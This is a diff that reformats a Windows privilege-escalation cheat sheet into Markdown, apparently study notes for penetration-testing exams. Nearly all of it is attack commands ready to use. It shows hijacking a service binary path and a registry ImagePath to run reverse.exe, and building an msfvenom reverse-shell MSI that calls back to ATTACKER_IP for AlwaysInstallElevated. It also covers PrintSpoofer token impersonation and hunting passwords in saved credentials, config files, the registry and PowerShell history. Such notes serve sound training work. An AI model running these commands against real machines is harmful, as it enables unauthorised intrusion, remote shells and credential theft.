@@ -1,4 +1,4 @@
-1. Quick Enumeration
+## Quick Enumeration
    
 whoami /all
 systeminfo
@@ -7,25 +7,23 @@ net localgroup administrators
 ipconfig /all
 tasklist /svc
 
-✅ Use winPEAS or Seatbelt for automated checks
-✅ Run: .\winPEAS.exe quiet cmd windowscreds
-
-
 winPEAS, privilege escalation
 
 
 
 
 
-2. Kernel Exploits
+## Kernel Exploits
 
 Check OS version and missing patches:
 
-systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
-wmic qfe get Caption,Description,HotFixID,InstalledOn
+`systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
 
-✅ Use Watson or Windows Exploit Suggester (WES)
-✅ Try: MS16-032, MS17-010 (EternalBlue), CVE-2019-1388
+`wmic qfe get Caption,Description,HotFixID,InstalledOn`
+
+Use Watson or Windows Exploit Suggester (WES)
+
+Try: MS16-032, MS17-010 (EternalBlue), CVE-2019-1388
 
 
 Windows exploit suggester OSCP
@@ -34,27 +32,28 @@ Windows exploit suggester OSCP
 
 
 
-3. Service Exploits
+## Service Exploits
    
 Insecure Permissions
-sc qc <service_name>
-.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+`sc qc <service_name>`
+
+`.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *`
 
 If you can modify a service:
 
-sc config <service_name> binpath="C:\path\to\reverse.exe"
-net stop <service_name> && net start <service_name>
+`sc config <service_name> binpath="C:\path\to\reverse.exe"`
+`net stop <service_name> && net start <service_name>`
 
-Unquoted Service Paths
-wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\"
+### Unquoted Service Paths
+`wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\"`
 
 Exploit by placing binary in path:
 
-copy reverse.exe "C:\Program Files\Example Path\reverse.exe"
+`copy reverse.exe "C:\Program Files\Example Path\reverse.exe"`
 
-Weak Registry Permissions
-reg add HKLM\SYSTEM\CurrentControlSet\services\<svc> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
-net start <svc>
+## Weak Registry Permissions
+`reg add HKLM\SYSTEM\CurrentControlSet\services\<svc> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`
+`net start <svc>`
 
 
 Insecure service permissions Windows privesc site:reddit.com
@@ -63,65 +62,59 @@ Insecure service permissions Windows privesc site:reddit.com
 
 
 
-4. AlwaysInstallElevated
+## AlwaysInstallElevated
    
 Check both registry keys:
 
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
 
 If both are 0x1:
 
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f msi -o reverse.msi
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f msi -o reverse.msi`
 
 On target:
 
-msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`
 
 
-AlwaysInstallElevated privilege escalation
-
-
-
-
-
-5. Token Impersonation
+## Token Impersonation
    
 Check for:
 
-whoami /priv
+`whoami /priv`
 
 Look for:
 
+```powershell
 SeImpersonatePrivilege
 SeAssignPrimaryTokenPrivilege
+```
+
 Exploit with:
 
-PrintSpoofer: PrintSpoofer.exe -c "cmd.exe"
+PrintSpoofer: `PrintSpoofer.exe -c "cmd.exe"`
 Juicy Potato / Rotten Potato (older systems)
-✅ Works on Windows 10 < 1809 and Server 2016
+
+Works on Windows 10 < 1809 and Server 2016
 
 
-PrintSpoofer, privilege escalation
-
-
-
-
-
-6. Password Hunting
+## Password Hunting
    
 Saved Credentials
-cmdkey /list
-runas /savecred /user:admin "C:\PrivEsc\reverse.exe"
+`cmdkey /list`
+`runas /savecred /user:admin "C:\PrivEsc\reverse.exe"`
 
-Configuration Files
-dir /s *pass* == *.config
-findstr /si password *.xml *.ini *.txt
+## Configuration Files
+`dir /s *pass* == *.config`
+`findstr /si password *.xml *.ini *.txt`
 
-Registry
+## Registry
+```powershell
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+```
 
 PowerShell History
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
